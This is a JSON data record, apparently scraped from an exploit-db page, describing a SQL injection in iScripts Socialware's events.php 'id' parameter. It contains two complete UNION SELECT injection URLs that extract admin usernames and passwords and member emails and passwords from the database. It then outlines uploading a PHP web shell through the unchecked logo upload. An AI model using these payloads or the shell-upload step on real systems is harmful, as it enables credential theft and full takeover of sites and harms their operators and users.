      {
        "type": "exploit",
        "source": "exploit-db.com_d45d9557_20250125_224922.html",
         "content": "The vulnerability is a SQL injection in `iScripts Socialware` at the `events.php?action=show&id=` parameter. By manipulating the `id` parameter an attacker can inject SQL code to retrieve sensitive information from the database.\n\nSpecifically, the exploit allows an attacker to:\n\n1.  Retrieve admin usernames and passwords by injecting SQL: `www.site.com/events.php?action=show&id=-1/**/UNION/**/ALL/**/SELECT/**/1,2,concat(0x3c666f6e7420636f6c6f723d22726564223e,Username,char(58),Password,0x3c2f666f6e743e),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28/**/FROM/**/admin_users/*`\n2. Retrieve member emails and passwords by injecting SQL: `www.site.com/events.php?action=show&id=-1/**/UNION/**/ALL/**/SELECT/**/1,2,concat(0x3c666f6e7420636f6c6f723d22726564223e,email,char(58),password,0x3c2f666f6e743e),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28/**/FROM/**/members/*`\n\nPasswords are stored in plaintext. The vulnerability can also be leveraged to upload a shell by logging into the admin panel and uploading a php file as a logo because file extensions are not checked. The uploaded shell can be accessed under the /images directory."
